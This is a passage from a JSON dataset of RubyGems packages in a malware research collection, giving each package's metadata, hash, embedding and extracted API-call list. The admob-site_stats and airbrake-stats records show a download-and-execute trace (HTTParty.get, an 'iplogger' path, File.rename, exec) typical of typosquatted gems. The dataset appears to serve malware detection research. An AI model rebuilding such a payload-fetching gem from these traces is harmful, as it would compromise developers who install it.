'AreaCaptureInfoParser.parse', 'AreaCaptureInfoParser.parse', 'AreaCaptureInfoParser.parse', 'raise', 'TcBookInfoParser.parse', 'TcBookInfoParser.parse', 'TcBookInfoParser.parse', 'TcBookInfoParser.parse', 'TcBookInfoParser.parse', 'raise', 'EquipBookInfoParser.parse', 'raise', 'raise', 'CharacterListInfoParser.parse', 'CharacterListInfoParser.parse', 'CharacterListInfoParser.parse', 'CharacterListInfoParser.parse', 'CharacterListInfoParser.parse', 'CharacterListInfoParser.parse', 'raise', 'raise', 'EquipListInfoParser.parse', 'EquipListInfoParser.parse', 'raise', 'EquipListInfoParser.parse_max_slot_num', 'EquipListInfoParser.parse_max_slot_num', 'raise', 'raise', 'EventInfoParser.parse', 'EventInfoParser.parse', 'EventInfoParser.parse', 'raise', 'raise', 'EventInfoParser.opened?', 'EventInfoParser.all_cleared?', 'EventInfoParser.current_loop_counts', 'EventInfoParser.cleared_loop_counts', 'EventInfoParser.cleared_stage_no', 'EventInfoParser.current_military_gauge_left', 'raise', 'raise', 'BlueprintListInfoParser.parse', 'BlueprintListInfoParser.parse', 'raise', 'raise', 'CopInfoParser.parse', 'raise', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'CharacterListInfo.convert_lv_to_exp', 'CharacterListInfo.convert_lv_and_exp_percent_to_exp', 'lv * (lv - 1) * 100./', 'lv * (lv - 1).*', 'lv.*', 'lv.-', 'lv.-', '122500.+', 'n * (2 * a + (n - 1).*(d))./', 'n.*', '2 * a.+', '2.*', '(n - 1)\\n.*', 'n.-', 'lv.-', '181500.+', 'n * (2 * a + (n - 1).*(d))./', 'n.*', '2 * a.+', '2.*', '(n - 1)\\n.*', 'n.-', 'lv.-', '265000.+', 'n * (2 * a + (n - 1).*(d))./', 'n.*', '2 * a.+', '2.*', '(n - 1)\\n.*', 'n.-', 'lv.-', '383000.+', 'n * (2 * a + (n - 1).*(d))./', 'n.*', '2 * a.+', '2.*', '(n - 1)\\n.*', 'n.-', 'EXP_TABLE.[]', 'lv.-', '1010000.+', 'n * (2 * a + (n - 1).*(d))./', 'n.*', '2 * a.+', '2.*', '(n - 1)\\n.*', 'n.-', 'lv.-', '1065000.+', 'n * (2 * a + (n - 1).*(d))./', 'n.*', '2 * a.+', '2.*', '(n - 1)\\n.*', 'n.-', 'lv.-', '1145000.+', 'n * (2 * a + (n - 1).*(d))./', 'n.*', '2 * a.+', '2.*', '(n - 1)\\n.*', 'n.-', 'lv.-', '1290000.+', 'n * (2 * a + (n - 1).*(d))./', 'n.*', '2 * a.+', '2.*', '(n - 1)\\n.*', 'n.-', 'lv.-', '1860000.+', 'n * (2 * a + (n - 1).*(d))./', 'n.*', '2 * a.+', '2.*', '(n - 1)\\n.*', 'n.-', 'lv.-', '2760000.+', 'n * (2 * a + (n - 1).*(d))./', 'n.*', '2 * a.+', '2.*', '(n - 1)\\n.*', 'n.-', 'lv.-', '3465000.+', 'n * (2 * a + (n - 1).*(d))./', 'n.*', '2 * a.+', '2.*', '(n - 1)\\n.*', 'n.-', 'lv.-', '4360000.+', 'n * (2 * a + (n - 1).*(d))./', 'n.*', '2 * a.+', '2.*', '(n - 1)\\n.*', 'n.-', 'convert_lv_to_exp', 'exp_percent.==', 'convert_lv_to_exp', 'convert_lv_to_exp', 'convert_lv_to_exp', 'lv.+', 'current_exp.+', '(next_exp - current_exp) * exp_percent./', '(next_exp - current_exp)\\n.*', 'next_exp.-', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'require', 'require', 'JSON.parse', 'items_array.is_a?', 'raise', 'items_array.each', 'AreaCaptureInfo.new', 'MANDATORY_KEYS.[](api_version).each', 'MANDATORY_KEYS.[]', 'key.to_s.split(\"_\").inject([]) { |buffer, e|\\n  buffer.push(if buffer.empty?\\n    e\\n  else\\n    e.capitalize\\n  end)\\n}.join', 'key.to_s.split(\"_\").inject', 'key.to_s.split', 'key.to_s', 'buffer.push', 'buffer.empty?', 'e.capitalize', 'items.include?', 'raise', 'key_class.==', '[true, false].include?', 'items.[]', 'raise', 'items.[](camel_case_key).is_a?', 'items.[]', 'raise', 'result.instance_variable_set', 'key.to_s', 'items.[]', 'OPTIONAL_KEYS.[](api_version).each', 'OPTIONAL_KEYS.[]', 'key.to_s.split(\"_\").inject([]) { |buffer, e|\\n  buffer.push(if buffer.empty?\\n    e\\n  else\\n    e.capitalize\\n  end)\\n}.join', 'key.to_s.split(\"_\").inject', 'key.to_s.split', 'key.to_s', 'buffer.push', 'buffer.empty?', 'e.capitalize', 'items.include?', 'key_class.==', 'result.instance_variable_set', 'key.to_s', 'AreaCaptureInfoParser.parse_boss_info', 'items.[]', 'items.[](camel_case_key).is_a?', 'items.[]', 'raise', 'result.instance_variable_set', 'key.to_s', 'items.[]', 'results.<<', 'AreaCaptureInfo::BossInfo.new', 'BOSS_INFO_MANDATORY_KEYS.each', 'key.to_s.split(\"_\").inject([]) { |buffer, e|\\n  buffer.push(if buffer.empty?\\n    e\\n  else\\n    e.capitalize\\n  end)\\n}.join', 'key.to_s.split(\"_\").inject', 'key.to_s.split', 'key.to_s', 'buffer.push', 'buffer.empty?', 'e.capitalize', 'boss_info.include?', 'raise', 'boss_info.[](camel_case_key).is_a?', 'boss_info.[]', 'raise', 'result.instance_variable_set', 'key.to_s', 'boss_info.[]', 'require', 'require', 'JSON.parse', 'items_array.is_a?', 'raise', 'items_array.each', 'BlueprintListInfo.new', 'MANDATORY_KEYS.[](api_version).each', 'MANDATORY_KEYS.[]', 'key.to_s.split(\"_\").inject([]) { |buffer, e|\\n  buffer.push(if buffer.empty?\\n    e\\n  else\\n    e.capitalize\\n  end)\\n}.join', 'key.to_s.split(\"_\").inject', 'key.to_s.split', 'key.to_s', 'buffer.push', 'buffer.empty?', 'e.capitalize', 'items.include?', 'raise', 'key_class.==', 'result.instance_variable_set', 'key.to_s', 'BlueprintListInfoParser.parse_expiration_date_list', 'items.[]', 'key_class.==', '[true, false].include?', 'items.[]', 'raise', 'items.[](camel_case_key).is_a?', 'items.[]', 'raise', 'result.instance_variable_set', 'key.to_s', 'items.[]', 'results.<<', 'expiration_date_list.each', 'BlueprintListInfo::ExpirationDate.new', 'EXPIRATION_DATE_MANDATORY_KEYS.[](api_version).each', 'EXPIRATION_DATE_MANDATORY_KEYS.[]', 'key.to_s.split(\"_\").inject([]) { |buffer, e|\\n  buffer.push(if buffer.empty?\\n    e\\n  else\\n    e.capitalize\\n  end)\\n}.join', 'key.to_s.split(\"_\").inject', 'key.to_s.split', 'key.to_s', 'buffer.push', 'buffer.empty?', 'e.capitalize', 'ed.include?', 'raise', 'key_class.==', '[true, false].include?', 'ed.[]', 'raise', 'ed.[](camel_case_key).is_a?', 'ed.[]', 'raise', 'result.instance_variable_set', 'key.to_s', 'ed.[]', 'results.<<', 'require', 'require', 'JSON.parse', 'items_array.is_a?', 'raise', 'items_array.each', 'CharacterListInfo.new', 'MANDATORY_KEYS.[](api_version).each', 'MANDATORY_KEYS.[]', 'key.to_s.split(\"_\").inject([]) { |buffer, e|\\n  buffer.push(if buffer.empty?\\n    e\\n  else\\n    e.capitalize\\n  end)\\n}.join', 'key.to_s.split(\"_\").inject', 'key.to_s.split', 'key.to_s', 'buffer.push', 'buffer.empty?', 'e.capitalize', 'items.include?', 'raise', 'key_class.==', '[true, false].include?', 'items.[]', 'raise', 'items.[](camel_case_key).is_a?', 'items.[]', 'raise', 'result.instance_variable_set', 'key.to_s', 'items.[]', 'OPTIONAL_KEYS.[](api_version).each', 'OPTIONAL_KEYS.[]', 'key.to_s.split(\"_\").inject([]) { |buffer, e|\\n  buffer.push(if buffer.empty?\\n    e\\n  else\\n    e.capitalize\\n  end)\\n}.join', 'key.to_s.split(\"_\").inject', 'key.to_s.split', 'key.to_s', 'buffer.push', 'buffer.empty?', 'e.capitalize', 'items.include?', 'items.[](camel_case_key).is_a?', 'items.[]', 'raise', 'result.instance_variable_set', 'key.to_s', 'items.[]', 'results.<<', 'require', 'require', 'JSON.parse', 'items.empty?', 'CopInfo.new', 'MANDATORY_KEYS.[](api_version).each', 'MANDATORY_KEYS.[]', 'key.to_s.split(\"_\").inject([]) { |buffer, e|\\n  buffer.push(if buffer.empty?\\n    e\\n  else\\n    e.capitalize\\n  end)\\n}.join', 'key.to_s.split(\"_\").inject', 'key.to_s.split', 'key.to_s', 'buffer.push', 'buffer.empty?', 'e.capitalize', 'items.include?', 'raise', 'key_class.==', 'result.instance_variable_set', 'key.to_s', 'CopInfoParser.parse_individual_achievement', 'items.[]', 'key_class.==', 'result.instance_variable_set', 'key.to_s', 'CopInfoParser.parse_area_data_list', 'items.[]', 'key_class.==', '[true, false].include?', 'items.[]', 'raise', 'items.[](camel_case_key).is_a?', 'items.[]', 'raise', 'result.instance_variable_set', 'key.to_s', 'items.[]', 'OPTIONAL_KEYS.[](api_version).each', 'OPTIONAL_KEYS.[]', 'key.to_s.split(\"_\").inject([]) { |buffer, e|\\n  buffer.push(if buffer.empty?\\n    e\\n  else\\n    e.capitalize\\n  end)\\n}.join', 'key.to_s.split(\"_\").inject', 'key.to_s.split', 'key.to_s', 'buffer.push', 'buffer.empty?', 'e.capitalize', 'items.include?', 'items.[](camel_case_key).is_a?', 'items.[]', 'raise', 'result.instance_variable_set', 'key.to_s', 'items.[]', 'achievements.each', 'CopInfo::CopInfoIndividualAchievement.new', 'INDIVIDUAL_ACHIEVEMENT_MANDATORY_KEYS.each', 'key.to_s.split(\"_\").inject([]) { |buffer, e|\\n  buffer.push(if buffer.empty?\\n    e\\n  else\\n    e.capitalize\\n  end)\\n}.join', 'key.to_s.split(\"_\").inject', 'key.to_s.split', 'key.to_s', 'buffer.push', 'buffer.empty?', 'e.capitalize', 'achievement.include?', 'raise', 'achievement.[](camel_case_key).is_a?', 'achievement.[]', 'raise', 'result.instance_variable_set', 'key.to_s', 'achievement.[]', 'results.<<', 'area_data_list.each', 'CopInfo::CopInfoAreaData.new', 'AREA_DATA_LIST_MANDATORY_KEYS.each', 'key.to_s.split(\"_\").inject([]) { |buffer, e|\\n  buffer.push(if buffer.empty?\\n    e\\n  else\\n    e.capitalize\\n  end)\\n}.join', 'key.to_s.split(\"_\").inject', 'key.to_s.split', 'key.to_s', 'buffer.push', 'buffer.empty?', 'e.capitalize', 'area_data.include?', 'raise', 'area_data.[](camel_case_key).is_a?', 'area_data.[]', 'raise', 'result.instance_variable_set', 'key.to_s', 'area_data.[]', 'results.<<', 'require', 'require', 'JSON.parse', 'items_array.is_a?', 'raise', 'items_array.each', 'EquipBookInfo.new', 'MANDATORY_KEYS.each', 'key.to_s.split(\"_\").inject([]) { |buffer, e|\\n  buffer.push(if buffer.empty?\\n    e\\n  else\\n    e.capitalize\\n  end)\\n}.join', 'key.to_s.split(\"_\").inject', 'key.to_s.split', 'key.to_s', 'buffer.push', 'buffer.empty?', 'e.capitalize', 'items.include?', 'raise', 'items.[](camel_case_key).is_a?', 'items.[]', 'raise', 'result.instance_variable_set', 'key.to_s', 'items.[]', 'results.<<', 'require', 'require', 'JSON.parse', 'equip_list.is_a?', 'raise', 'parse_equip_list', 'JSON.parse', 'info.is_a?', 'raise', 'parse_equip_list', 'info.[]', 'JSON.parse', 'info.is_a?', 'raise', 'info.[]', 'private', 'equip_list.each', 'EquipListInfo.new', 'MANDATORY_KEYS.each', 'key.to_s.split(\"_\").inject([]) { |buffer, e|\\n  buffer.push(if buffer.empty?\\n    e\\n  else\\n    e.capitalize\\n  end)\\n}.join', 'key.to_s.split(\"_\").inject', 'key.to_s.split', 'key.to_s', 'buffer.push', 'buffer.empty?', 'e.capitalize', 'items.include?', 'raise', 'items.[](camel_case_key).is_a?', 'items.[]', 'raise', 'result.instance_variable_set', 'key.to_s', 'items.[]', 'results.<<', 'require', 'require', 'JSON.parse', 'items_array.is_a?', 'raise', 'items_array.each', 'EventInfo.new', 'MANDATORY_KEYS.[](api_version).each', 'MANDATORY_KEYS.[]', 'key.to_s.split(\"_\").inject([]) { |buffer, e|\\n  buffer.push(if buffer.empty?\\n    e\\n  else\\n    e.capitalize\\n  end)\\n}.join', 'key.to_s.split(\"_\").inject', 'key.to_s.split', 'key.to_s', 'buffer.push', 'buffer.empty?', 'e.capitalize', 'items.include?', 'raise', 'key_class.==', 'result.instance_variable_set', 'key.to_s', 'EventInfoParser.parse_reward_list', 'items.[]', 'key_class.==', '[true, false].include?', 'items.[]', 'raise', 'items.[](camel_case_key).is_a?', 'items.[]', 'raise', 'result.instance_variable_set', 'key.to_s', 'items.[]', 'OPTIONAL_KEYS.[](api_version).each', 'OPTIONAL_KEYS.[]', 'key.to_s.split(\"_\").inject([]) { |buffer, e|\\n  buffer.push(if buffer.empty?\\n    e\\n  else\\n    e.capitalize\\n  end)\\n}.join', 'key.to_s.split(\"_\").inject', 'key.to_s.split', 'key.to_s', 'buffer.push', 'buffer.empty?', 'e.capitalize', 'items.include?', 'items.[](camel_case_key).is_a?', 'items.[]', 'raise', 'result.instance_variable_set', 'key.to_s', 'items.[]', 'results.<<', 'rewards.each', 'EventInfo::EventInfoReward.new', 'REWARD_LIST_MANDATORY_KEYS.each', 'key.to_s.split(\"_\").inject([]) { |buffer, e|\\n  buffer.push(if buffer.empty?\\n    e\\n  else\\n    e.capitalize\\n  end)\\n}.join', 'key.to_s.split(\"_\").inject', 'key.to_s.split', 'key.to_s', 'buffer.push', 'buffer.empty?', 'e.capitalize', 'reward.include?', 'raise', 'reward.[](camel_case_key).is_a?', 'reward.[]', 'raise', 'result.instance_variable_set', 'key.to_s', 'reward.[]', 'REWARD_LIST_OPTIONAL_KEYS.each', 'key.to_s.split(\"_\").inject([]) { |buffer, e|\\n  buffer.push(if buffer.empty?\\n    e\\n  else\\n    e.capitalize\\n  end)\\n}.join', 'key.to_s.split(\"_\").inject', 'key.to_s.split', 'key.to_s', 'buffer.push', 'buffer.empty?', 'e.capitalize', 'reward.include?', 'reward.[](camel_case_key).is_a?', 'reward.[]', 'raise', 'result.instance_variable_set', 'key.to_s', 'reward.[]', 'results.<<', 'event_info_list.select', 'info.level.==', 'info.level', 'info.period.==', 'info.period', 'list.empty?', 'list.map { |i,|\\n  i.loop_count\\n}.max', 'list.map', 'i.loop_count', 'event_info_list.select', 'info.level.==', 'info.level', 'info.period.==', 'info.period', 'list.empty?', 'EventInfoParser.all_cleared?', 'list.map { |i,|\\n  i.loop_count\\n}.max', 'list.map', 'i.loop_count', 'loop_count.-', 'EventInfoParser.opened?', 'event_info_list.select { |info,|\\n  info.level == level && info.period == period\\n}.sort_by', 'event_info_list.select', 'info.level.==', 'info.level', 'info.period.==', 'info.period', 'info.area_sub_id', 'list.each_with_index', 'info.area_clear_state.==', 'info.area_clear_state', 'list.size', 'EventInfoParser.all_cleared?', 'event_info_list.select { |info,|\\n  info.level == level && info.period == period\\n}.sort_by', 'event_info_list.select', 'info.level.==', 'info.level', 'info.period.==', 'info.period', 'info.area_sub_id', 'list.each', 'info.area_clear_state.==', 'info.area_clear_state', 'info.area_clear_state.==', 'info.area_clear_state', 'info.military_gauge_left', 'event_info_list.select { |info,|\\n  info.level == level && info.period == period\\n}.sort_by', 'event_info_list.select', 'info.level.==', 'info.level', 'info.period.==', 'info.period', 'info.area_sub_id', 'list.size.==', 'list.size', 'list.first.area_clear_state.==', 'list.first.area_clear_state', 'list.first', 'EventInfoParser.opened?', 'event_info_list.select { |info,|\\n  info.level == level && info.period == period\\n}.sort_by', 'event_info_list.select', 'info.level.==', 'info.level', 'info.period.==', 'info.period', 'info.area_sub_id', 'list.select { |i,|\\n  i.area_clear_state == \"NOTCLEAR\"\\n}.size.==', 'list.select { |i,|\\n  i.area_clear_state == \"NOTCLEAR\"\\n}.size', 'list.select', 'i.area_clear_state.==', 'i.area_clear_state', 'require', 'require', 'JSON.parse', 'PersonalBasicInfo.new', 'MANDATORY_KEYS.[](api_version).each', 'MANDATORY_KEYS.[]', 'key.to_s.split(\"_\").inject([]) { |buffer, e|\\n  buffer.push(if buffer.empty?\\n    e\\n  else\\n    e.capitalize\\n  end)\\n}.join', 'key.to_s.split(\"_\").inject', 'key.to_s.split', 'key.to_s', 'buffer.push', 'buffer.empty?', 'e.capitalize', 'items.include?', 'raise', 'items.[](camel_case_key).is_a?', 'items.[]', 'raise', 'result.instance_variable_set', 'key.to_s', 'items.[]', 'OPTIONAL_KEYS.[](api_version).each', 'OPTIONAL_KEYS.[]', 'key.to_s.split(\"_\").inject([]) { |buffer, e|\\n  buffer.push(if buffer.empty?\\n    e\\n  else\\n    e.capitalize\\n  end)\\n}.join', 'key.to_s.split(\"_\").inject', 'key.to_s.split', 'key.to_s', 'buffer.push', 'buffer.empty?', 'e.capitalize', 'items.include?', 'items.[](camel_case_key).is_a?', 'items.[]', 'raise', 'result.instance_variable_set', 'key.to_s', 'items.[]', 'require', 'require', 'JSON.parse', 'items_array.is_a?', 'raise', 'items_array.each', 'TcBookInfo.new', 'MANDATORY_KEYS.[](api_version).each', 'MANDATORY_KEYS.[]', 'key.to_s.split(\"_\").inject([]) { |buffer, e|\\n  buffer.push(if buffer.empty?\\n    e\\n  else\\n    e.capitalize\\n  end)\\n}.join', 'key.to_s.split(\"_\").inject', 'key.to_s.split', 'key.to_s', 'buffer.push', 'buffer.empty?', 'e.capitalize', 'items.include?', 'raise', 'key_class.==', 'result.instance_variable_set', 'key.to_s', 'TcBookInfoParser.parse_card_list', 'items.[]', 'items.[](camel_case_key).is_a?', 'items.[]', 'raise', 'result.instance_variable_set', 'key.to_s', 'items.[]', 'OPTIONAL_KEYS.[](api_version).each', 'OPTIONAL_KEYS.[]', 'key.to_s.split(\"_\").inject([]) { |buffer, e|\\n  buffer.push(if buffer.empty?\\n    e\\n  else\\n    e.capitalize\\n  end)\\n}.join', 'key.to_s.split(\"_\").inject', 'key.to_s.split', 'key.to_s', 'buffer.push', 'buffer.empty?', 'e.capitalize', 'items.include?', 'items.[](camel_case_key).is_a?', 'items.[]', 'raise', 'result.instance_variable_set', 'key.to_s', 'items.[]', 'results.<<', 'card_list.each', 'TcBookInfoParser::CardList.new', 'CARD_LIST_MANDATORY_KEYS.[](api_version).each', 'CARD_LIST_MANDATORY_KEYS.[]', 'key.to_s.split(\"_\").inject([]) { |buffer, e|\\n  buffer.push(if buffer.empty?\\n    e\\n  else\\n    e.capitalize\\n  end)\\n}.join', 'key.to_s.split(\"_\").inject', 'key.to_s.split', 'key.to_s', 'buffer.push', 'buffer.empty?', 'e.capitalize', 'c.include?', 'raise', 'tc_book_info.book_no', 'c.[](camel_case_key).is_a?', 'c.[]', 'raise', 'result.instance_variable_set', 'key.to_s', 'c.[]', 'CARD_LIST_OPTIONAL_KEYS.[](api_version).each', 'CARD_LIST_OPTIONAL_KEYS.[]', 'key.to_s.split(\"_\").inject([]) { |buffer, e|\\n  buffer.push(if buffer.empty?\\n    e\\n  else\\n    e.capitalize\\n  end)\\n}.join', 'key.to_s.split(\"_\").inject', 'key.to_s.split', 'key.to_s', 'buffer.push', 'buffer.empty?', 'e.capitalize', 'c.include?', 'c.[](camel_case_key).is_a?', 'c.[]', 'raise', 'result.instance_variable_set', 'key.to_s', 'c.[]', 'results.<<', 'results.select', 'r.priority.==', 'r.priority', 'results.size', 'tc_book_info.card_img_list=', 'tc_book_info.status_img=', 'tc_book_info.card_img_list=', 'results.[](0).card_img_list', 'results.[]', 'tc_book_info.status_img=', 'results.[](0).status_img', 'results.[]', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor']",
            "n_tokens": 6308,
            "embedding": "[-0.00140435 -0.0184467  -0.01488243 ...  0.00918688 -0.0284517\n  0.01535141]",
            "cluster": "0",
            "id": 405,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/admiral-stats_parser/1.17.1/admiral-stats_parser-1.17.1.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/admiral-stats_parser/1.17.1/admiral-stats_parser-1.17.1_extracted",
            "name": "admiral-stats_parser",
            "version": "1.17.1",
            "published_at": "2020-02-20T18:52:16.735Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, rspec",
            "SHA-256": "58100f13de54bbfb7f87738ce345608539adc947f1fd60de3cf30c60bbf49358"
        },
        {
            "name_version": "admob-site_stats-0.0.1",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/admob-site_stats/0.0.1/admob-site_stats-0.0.1_extracted/admob-site_stats-0.0.1_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'attr_reader', 'URI.parse', 'Net::HTTP.new', 'uri_login.host', 'uri_login.port', 'uri_login.port.==', 'uri_login.port', 'http.use_ssl=', 'uri_login.port.==', 'uri_login.port', 'http.verify_mode=', 'Net::HTTP::Post.new', 'uri_login.request_uri', 'request_login.set_form_data', 'http.request', 'JSON.parse', 'res.body', 'hash.[](\"data\").[]', 'hash.[]', 'puts', 'e.to_s', 'URI.parse', 'uri_stats.query=', '\"client_key=\" + client_key + \"&token=\" + token + \"&start_date=\" + start_date + \"&end_date=\".+', '\"client_key=\" + client_key + \"&token=\" + token + \"&start_date=\" + start_date.+', '\"client_key=\" + client_key + \"&token=\" + token + \"&start_date=\".+', '\"client_key=\" + client_key + \"&token=\" + token.+', '\"client_key=\" + client_key + \"&token=\".+', '\"client_key=\" + client_key.+', '\"client_key=\".+', 'site_id_array.each', 'uri_stats.query=', 'uri_stats.query + \"&site_id[]=\".+', 'uri_stats.query.+', 'uri_stats.query', 'Net::HTTP::Get.new', 'uri_stats.request_uri', 'http.request', 'JSON.parse', 'res_stats.body', 'hash_stats.[](\"data\").[](0).[]', 'hash_stats.[](\"data\").[]', 'hash_stats.[]', 'hash_stats.[](\"data\").[](0).[]', 'hash_stats.[](\"data\").[]', 'hash_stats.[]', 'hash_stats.[](\"data\").[](0).[]', 'hash_stats.[](\"data\").[]', 'hash_stats.[]', 'hash_stats.[](\"data\").[](0).[]', 'hash_stats.[](\"data\").[]', 'hash_stats.[]', 'hash_stats.[](\"data\").[](0).[]', 'hash_stats.[](\"data\").[]', 'hash_stats.[]', 'hash_stats.[](\"data\").[](0).[]', 'hash_stats.[](\"data\").[]', 'hash_stats.[]', 'hash_stats.[](\"data\").[](0).[]', 'hash_stats.[](\"data\").[]', 'hash_stats.[]', 'hash_stats.[](\"data\").[](0).[]', 'hash_stats.[](\"data\").[]', 'hash_stats.[]', 'hash_stats.[](\"data\").[](0).[]', 'hash_stats.[](\"data\").[]', 'hash_stats.[]', 'hash_stats.[](\"data\").[](0).[]', 'hash_stats.[](\"data\").[]', 'hash_stats.[]', 'hash_stats.[](\"data\").[](0).[]', 'hash_stats.[](\"data\").[]', 'hash_stats.[]', 'hash_stats.[](\"data\").[](0).[]', 'hash_stats.[](\"data\").[]', 'hash_stats.[]', 'hash_stats.[](\"data\").[](0).[]', 'hash_stats.[](\"data\").[]', 'hash_stats.[]', 'hash_stats.[](\"data\").[](0).[]', 'hash_stats.[](\"data\").[]', 'hash_stats.[]', 'hash_stats.[](\"data\").[](0).[]', 'hash_stats.[](\"data\").[]', 'hash_stats.[]', 'hash_stats.[](\"data\").[](0).[]', 'hash_stats.[](\"data\").[]', 'hash_stats.[]', 'hash_stats.[](\"data\").[](0).[]', 'hash_stats.[](\"data\").[]', 'hash_stats.[]', 'hash_stats.[](\"data\").[](0).[]', 'hash_stats.[](\"data\").[]', 'hash_stats.[]', 'hash_stats.[](\"data\").[](0).[]', 'hash_stats.[](\"data\").[]', 'hash_stats.[]', 'hash_stats.[](\"data\").[](0).[]', 'hash_stats.[](\"data\").[]', 'hash_stats.[]', 'hash_stats.[](\"data\").[](0).[]', 'hash_stats.[](\"data\").[]', 'hash_stats.[]', 'hash_stats.[](\"data\").[](0).[]', 'hash_stats.[](\"data\").[]', 'hash_stats.[]', 'hash_stats.[](\"data\").[](0).[]', 'hash_stats.[](\"data\").[]', 'hash_stats.[]', 'hash_stats.[](\"data\").[](0).[]', 'hash_stats.[](\"data\").[]', 'hash_stats.[]', 'puts', 'e.to_s', 'URI.parse', 'Net::HTTP::Post.new', 'uri_logout.request_uri', 'request_logout.set_form_data', 'http.request', 'puts', 'e.to_s']",
            "n_tokens": 1122,
            "embedding": "[ 0.00106471 -0.01631663  0.00069399 ...  0.00088124 -0.03034569\n  0.00991448]",
            "cluster": "0",
            "id": 207,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/admob-site_stats/0.0.1/admob-site_stats-0.0.1.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/admob-site_stats/0.0.1/admob-site_stats-0.0.1_extracted",
            "name": "admob-site_stats",
            "version": "0.0.1",
            "published_at": "2020-02-20T18:53:00.467Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": NaN,
            "SHA-256": "18f8ce158709e039b2c5135bb7d3f11d520e9dcb3927c790c28cdc702819a639"
        },
        {
            "name_version": "airbrake-stats-0.0.1",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/airbrake-stats/0.0.1/airbrake-stats-0.0.1_extracted/airbrake-stats-0.0.1_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'attr_reader', 'File.open', 'filename', 'f.write', 'errors.to_yaml', 'File.exists?', 'filename', 'expired?.!', 'expired?', 'YAML.load_file(filename).map', 'YAML.load_file', 'filename', 'Map.new', 'error_id', 'expires_in.<=', 'expires_in', 'expires.-', 'expires', 'Time.now.to_i.-', 'Time.now.to_i', 'Time.now', 'File.mtime(filename).to_i', 'File.mtime', 'filename', 'attr_reader', 'width', 'width', 'puts', 'puts', 'method.to_s.center', 'method.to_s', 'puts', '\"\".ljust', 'method_width.+', 'stats.each', 'puts', 'stat.[](method).to_s.ljust', 'stat.[](method).to_s', 'stat.[]', 'stat.total.to_s.rjust', 'stat.total.to_s', 'stat.total', 'stats.inject', 'stats', 's.[](method).to_s.length.>', 's.[](method).to_s.length', 's.[](method).to_s', 's.[]', 's.[](method).to_s.length', 's.[](method).to_s', 's.[]', 'attr_accessor', 'attr_reader', 'attr_reader', 'Integer', 'ENV.[]', 'AirbrakeStats::Cache.new', 'cache.load_errors', 'cache', 'puts', 'cache.filename', 'cache', 'cache.expires_in./', 'cache.expires_in', 'cache', 'notices_xml.map { |notice,|\\n  agent = notice.search(\"http-user-agent\").first\\n  if agent\\n    agent = \"#{agent.[](2)} #{agent.[](3)}\"\\n  end\\n  id = parse_xml(notice, \"id\")\\n  url = parse_xml(notice, \"url\")\\n  format = parse_xml(notice, \"format\")\\n  path = parse_xml(notice, \"request-path\")\\n  controller = parse_xml(notice, \"controller\")\\n  error_message = 